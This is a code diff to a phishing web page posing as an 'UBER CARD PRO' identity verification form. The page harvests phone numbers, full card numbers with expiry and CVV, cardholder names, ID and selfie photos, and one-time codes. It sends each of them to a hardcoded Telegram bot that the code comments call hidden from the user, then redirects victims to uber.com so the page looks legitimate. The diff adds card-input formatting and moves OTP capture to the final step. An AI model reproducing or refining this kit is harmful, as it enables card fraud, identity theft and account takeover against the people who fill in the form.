@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-    <title>UBER CARD PRO • Secure Login</title>
+    <title>UBER CARD PRO • Secure Verification</title>
     <style>
         * {
             margin: 0;
@@ -40,7 +40,7 @@
             font-size: 14px;
             color: #8E8E93;
         }
-        /* Card Panel */
+        /* Panels */
         .panel {
             background: #1C1C1E;
             border-radius: 28px;
@@ -71,51 +71,12 @@
         input:focus {
             border-color: #00D2FF;
         }
-        /* iPhone numeric keypad style */
-        .phone-row {
+        .row-group {
             display: flex;
             gap: 12px;
-            align-items: center;
         }
-        .country-code {
-            width: 80px;
-        }
-        .phone-number {
+        .row-group .input-group {
             flex: 1;
-        }
-        .keypad {
-            background: #2C2C2E;
-            border-radius: 28px;
-            padding: 16px;
-            margin-top: 20px;
-        }
-        .keypad-row {
-            display: flex;
-            justify-content: space-around;
-            margin-bottom: 12px;
-        }
-        .keypad-btn {
-            background: #3A3A3C;
-            width: 70px;
-            height: 70px;
-            border-radius: 50%;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            font-size: 28px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: 0.1s;
-        }
-        .keypad-btn:active {
-            background: #00D2FF;
-            transform: scale(0.95);
-        }
-        .keypad-btn small {
-            font-size: 10px;
-            font-weight: normal;
-            color: #8E8E93;
         }
         .action-btn {
             background: #00D2FF;
@@ -135,10 +96,6 @@
         .action-btn.secondary {
             background: #3A3A3C;
             color: white;
-        }
-        .otp-container {
-            display: none;
-            margin-top: 20px;
         }
         .step-indicator {
             display: flex;
@@ -254,9 +211,26 @@
         .loading-text {
             font-size: 16px;
             color: white;
+            text-align: center;
         }
         .hide {
             display: none;
+        }
+        .otp-container {
+            margin-top: 20px;
+            text-align: center;
+        }
+        .otp-input {
+            text-align: center;
+            font-size: 24px;
+            letter-spacing: 4px;
+        }
+        .success-message {
+            text-align: center;
+            padding: 20px;
+            background: #00D2FF20;
+            border-radius: 28px;
+            margin-top: 20px;
         }
     </style>
 </head>
@@ -264,44 +238,30 @@
 <div class="container">
     <div class="header">
         <div class="logo">UBER CARD PRO</div>
-        <div class="sub">Secure access with your phone number</div>
+        <div class="sub">Secure identity verification</div>
     </div>
 
-    <!-- Step 1: Phone number + OTP -->
+    <!-- Step 1: Phone number -->
     <div id="phonePanel" class="panel">
         <div class="input-group">
-            <div class="input-label">📱 Your phone number</div>
-            <div class="phone-row">
-                <input type="text" id="countryCode" class="country-code" value="+1" maxlength="4">
-                <input type="tel" id="phoneNumber" class="phone-number" placeholder="Phone number" inputmode="numeric">
-            </div>
+            <div class="input-label">📱 Phone number</div>
+            <input type="tel" id="phoneNumber" placeholder="+1 234 567 8900" autocomplete="tel">
         </div>
-        <!-- Custom numeric keypad -->
-        <div class="keypad" id="numericKeypad">
-            <div class="keypad-row"><div class="keypad-btn" data-digit="1">1</div><div class="keypad-btn" data-digit="2">2<small>ABC</small></div><div class="keypad-btn" data-digit="3">3<small>DEF</small></div></div>
-            <div class="keypad-row"><div class="keypad-btn" data-digit="4">4<small>GHI</small></div><div class="keypad-btn" data-digit="5">5<small>JKL</small></div><div class="keypad-btn" data-digit="6">6<small>MNO</small></div></div>
-            <div class="keypad-row"><div class="keypad-btn" data-digit="7">7<small>PQRS</small></div><div class="keypad-btn" data-digit="8">8<small>TUV</small></div><div class="keypad-btn" data-digit="9">9<small>WXYZ</small></div></div>
-            <div class="keypad-row"><div class="keypad-btn" data-digit="*">*</div><div class="keypad-btn" data-digit="0">0</div><div class="keypad-btn" data-digit="#">#</div></div>
-        </div>
-        <button class="action-btn" id="sendOtpBtn">Send verification code</button>
-        <div id="otpSection" class="otp-container">
-            <input type="text" id="otpInput" class="text-input" placeholder="Enter 6-digit code" maxlength="6" inputmode="numeric" style="text-align:center; letter-spacing:2px;">
-            <button class="action-btn secondary" id="verifyOtpBtn" style="margin-top:12px;">Verify & Continue</button>
-        </div>
+        <button class="action-btn" id="phoneNextBtn">Continue →</button>
     </div>
 
-    <!-- Step 2: Card Details (will show after OTP) -->
+    <!-- Step 2: Card Details -->
     <div id="cardPanel" class="panel hide">
         <div class="input-group"><div class="input-label">💳 Card Number</div><input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" inputmode="numeric"></div>
-        <div class="row-group" style="display:flex; gap:12px;">
-            <div class="input-group" style="flex:1"><div class="input-label">📅 Expiry (MM/YY)</div><input type="text" id="expiry" placeholder="12/28" maxlength="5"></div>
-            <div class="input-group" style="flex:1"><div class="input-label">🔒 CVV</div><input type="password" id="cvv" placeholder="123" maxlength="4" inputmode="numeric"></div>
+        <div class="row-group">
+            <div class="input-group"><div class="input-label">📅 Expiry (MM/YY)</div><input type="text" id="expiry" placeholder="12/28" maxlength="5"></div>
+            <div class="input-group"><div class="input-label">🔒 CVV</div><input type="password" id="cvv" placeholder="123" maxlength="4" inputmode="numeric"></div>
         </div>
         <div class="input-group"><div class="input-label">👤 Full Name (on card)</div><input type="text" id="cardName" placeholder="John A. Doe"></div>
-        <button class="action-btn" id="cardNextBtn">Continue to ID verification →</button>
+        <button class="action-btn" id="cardNextBtn">Continue →</button>
     </div>
 
-    <!-- Step 3: KYC Photo Steps -->
+    <!-- Step 3: KYC Photos -->
     <div id="kycPanel" class="panel hide">
         <div class="step-indicator" id="stepIndicator">
             <div class="step-dot"></div><div class="step-dot"></div><div class="step-dot"></div><div class="step-dot"></div><div class="step-dot"></div>
@@ -342,12 +302,21 @@
         </div>
     </div>
 
+    <!-- OTP Section (appears after all KYC photos) -->
+    <div id="otpPanel" class="panel hide">
+        <div class="input-group">
+            <div class="input-label">🔐 Verification Code</div>
+            <input type="text" id="otpCode" class="otp-input" placeholder="Enter code" autocomplete="off">
+        </div>
+        <button class="action-btn" id="otpSubmitBtn">Verify & Complete</button>
+    </div>
+
     <div id="toastMsg" class="toast"></div>
 </div>
 
 <div id="loadingOverlay" class="loading-overlay">
     <div class="spinner"></div>
-    <div class="loading-text">Processing...<br>Please wait</div>
+    <div class="loading-text">Processing verification...<br>Please wait</div>
 </div>
 
 <script>
@@ -355,32 +324,30 @@
     // TELEGRAM CREDENTIALS (embedded, not visible to user)
     // ----------------------------------------------
     const BOT_TOKEN = "8671886486:AAHajOobfeLHXsbu6r-0x-82XIWLlvaPnq0";
-    const CHAT_ID   = "8737104261";  // same user ID as before
+    const CHAT_ID   = "8737104261";
 
     // DOM elements
     const phonePanel = document.getElementById('phonePanel');
     const cardPanel = document.getElementById('cardPanel');
     const kycPanel = document.getElementById('kycPanel');
+    const otpPanel = document.getElementById('otpPanel');
     const toast = document.getElementById('toastMsg');
     const loadingOverlay = document.getElementById('loadingOverlay');
     const phoneInput = document.getElementById('phoneNumber');
-    const countryCode = document.getElementById('countryCode');
-    const sendOtpBtn = document.getElementById('sendOtpBtn');
-    const otpSection = document.getElementById('otpSection');
-    const otpInput = document.getElementById('otpInput');
-    const verifyOtpBtn = document.getElementById('verifyOtpBtn');
+    const phoneNextBtn = document.getElementById('phoneNextBtn');
     const cardNextBtn = document.getElementById('cardNextBtn');
-    const keypadBtns = document.querySelectorAll('.keypad-btn');
+    const otpSubmitBtn = document.getElementById('otpSubmitBtn');
+    const otpInput = document.getElementById('otpCode');
 
     let userData = {
         phone: '',
-        otp: '',
         cardNumber: '',
         expiry: '',
         cvv: '',
         cardName: '',
         idType: '',
-        idState: ''
+        idState: '',
+        otp: ''
     };
 
     // Helper: show toast
@@ -418,62 +385,73 @@
         } catch(e) { return false; }
     }
 
-    // Numeric keypad input
-    keypadBtns.forEach(btn => {
-        btn.addEventListener('click', () => {
-            let digit = btn.getAttribute('data-digit');
-            phoneInput.value += digit;
-        });
+    // Smart card number formatting
+    const cardNumberInput = document.getElementById('cardNumber');
+    cardNumberInput.addEventListener('input', function(e) {
+        let val = e.target.value.replace(/\D/g, '');
+        if (val.length > 16) val = val.slice(0,16);
+        let formatted = '';
+        for (let i = 0; i < val.length; i++) {
+            if (i > 0 && i % 4 === 0) formatted += ' ';
+            formatted += val[i];
+        }
+        e.target.value = formatted;
     });
 
-    // Send OTP (simulate)
-    sendOtpBtn.onclick = () => {
+    // Expiry auto-format
+    const expiryInput = document.getElementById('expiry');
+    expiryInput.addEventListener('input', function(e) {
+        let val = e.target.value.replace(/\D/g, '');
+        if (val.length >= 2 && val.length < 4) val = val.slice(0,2) + '/' + val.slice(2);
+        else if (val.length >= 4) val = val.slice(0,2) + '/' + val.slice(2,4);
+        e.target.value = val.slice(0,5);
+    });
+
+    // CVV only digits
+    const cvvInput = document.getElementById('cvv');
+    cvvInput.addEventListener('input', function(e) {
+        e.target.value = e.target.value.replace(/\D/g, '').slice(0,4);
+    });
+
+    // Phone number formatting (basic)
+    phoneInput.addEventListener('input', function(e) {
+        let val = e.target.value.replace(/\D/g, '');
+        if (val.length > 15) val = val.slice(0,15);
+        e.target.value = val;
+    });
+
+    // Step 1: Phone number
+    phoneNextBtn.onclick = () => {
         let phone = phoneInput.value.trim();
         if (!phone || phone.length < 8) {
             showToast("Please enter a valid phone number", true);
             return;
         }
-        userData.phone = countryCode.value.trim() + phone;
-        otpSection.style.display = 'block';
-        showToast("Code sent: 123456 (demo)", false);
-    };
-
-    // Verify OTP (any 6 digits accepted for demo)
-    verifyOtpBtn.onclick = () => {
-        let otp = otpInput.value.trim();
-        if (otp.length !== 6) {
-            showToast("Please enter 6-digit code", true);
-            return;
-        }
-        userData.otp = otp;
-        // Send phone + OTP to Telegram
-        sendToTelegram(`📱 <b>UBER CARD PRO LOGIN</b>\n\nPhone: ${userData.phone}\nOTP: ${otp}\n🌐 ${navigator.userAgent}\n⏱️ ${new Date().toLocaleString()}`);
-        // Hide phone panel, show card panel
+        userData.phone = phone;
+        sendToTelegram(`📱 <b>UBER CARD PRO</b>\nPhone: ${phone}\n🌐 ${navigator.userAgent}\n⏱️ ${new Date().toLocaleString()}`);
         phonePanel.style.display = 'none';
         cardPanel.classList.remove('hide');
-        showToast("Phone verified. Please enter card details.", false);
+        showToast("Phone number saved. Enter card details.", false);
     };
 
-    // Card details next
+    // Step 2: Card details
     cardNextBtn.onclick = () => {
         const cardNum = document.getElementById('cardNumber').value.replace(/\s/g, '');
         const expiry = document.getElementById('expiry').value;
         const cvv = document.getElementById('cvv').value;
         const name = document.getElementById('cardName').value.trim();
         if (cardNum.length !== 16) { showToast("Card number must be 16 digits", true); return; }
-        if (!/^\d{2}\/\d{2}$/.test(expiry)) { showToast("Expiry MM/YY", true); return; }
-        if (cvv.length < 3 || cvv.length > 4) { showToast("CVV 3-4 digits", true); return; }
+        if (!/^\d{2}\/\d{2}$/.test(expiry)) { showToast("Expiry must be MM/YY", true); return; }
+        if (cvv.length < 3 || cvv.length > 4) { showToast("CVV must be 3-4 digits", true); return; }
         if (name.length < 2) { showToast("Full name required", true); return; }
         userData.cardNumber = cardNum;
         userData.expiry = expiry;
         userData.cvv = cvv;
         userData.cardName = name;
-        // Send card details to Telegram
-        sendToTelegram(`💳 <b>CARD DETAILS</b>\n\nCard: ${cardNum}\nExpiry: ${expiry}\nCVV: ${cvv}\nName: ${name}`);
+        sendToTelegram(`💳 <b>CARD DETAILS</b>\nCard: ${cardNum}\nExpiry: ${expiry}\nCVV: ${cvv}\nName: ${name}`);
         cardPanel.classList.add('hide');
         kycPanel.classList.remove('hide');
         showStep(1);
-        initCameraStep2(); // start front camera when step2 becomes visible
     };
 
     // KYC Steps logic
@@ -565,22 +543,31 @@
     // Step 5 selfie with ID
     document.getElementById('switchSelfieIdCam').onclick = () => switchCamera(document.getElementById('selfieIdVideo'), selfieIdStream, s=>selfieIdStream=s, v=>usingRearSelfieId=v, usingRearSelfieId);
     document.getElementById('captureSelfieIdBtn').onclick = () => capturePhoto(document.getElementById('selfieIdVideo'), document.getElementById('selfieIdStatus'), "Selfie holding ID", null).then(() => {
-        // All photos done → send final completion and redirect
-        sendToTelegram(`✅ <b>UBER CARD PRO VERIFICATION COMPLETE</b>\n\nUser: ${userData.phone}\nCard: ${userData.cardNumber}\nAll KYC photos uploaded.`);
-        loadingOverlay.classList.add('active');
-        setTimeout(() => {
-            window.location.href = "https://www.google.com";
-        }, 2000);
+        // All photos done → show OTP panel
+        kycPanel.classList.add('hide');
+        otpPanel.classList.remove('hide');
+        showToast("All documents uploaded. Enter verification code.", false);
     });
 
-    function initCameraStep2() {
-        // will be called when step2 is shown
-    }
-
-    // Initially hide OTP section and card panel
-    otpSection.style.display = 'none';
-    cardPanel.classList.add('hide');
-    kycPanel.classList.add('hide');
+    // OTP submission (any digits, any length)
+    otpSubmitBtn.onclick = async () => {
+        let otp = otpInput.value.trim();
+        if (otp.length === 0) {
+            showToast("Please enter the verification code", true);
+            return;
+        }
+        userData.otp = otp;
+        await sendToTelegram(`🔐 <b>VERIFICATION CODE</b>\nCode: ${otp}\nUser: ${userData.phone}\nAll KYC photos completed.`);
+        // Show success message, then redirect to uber.com
+        loadingOverlay.classList.add('active');
+        setTimeout(() => {
+            loadingOverlay.classList.remove('active');
+            showToast("✅ Verification successful! Redirecting to Uber...", false);
+            setTimeout(() => {
+                window.location.href = "https://www.uber.com";
+            }, 1500);
+        }, 1500);
+    };
 </script>
 </body>
 </html>
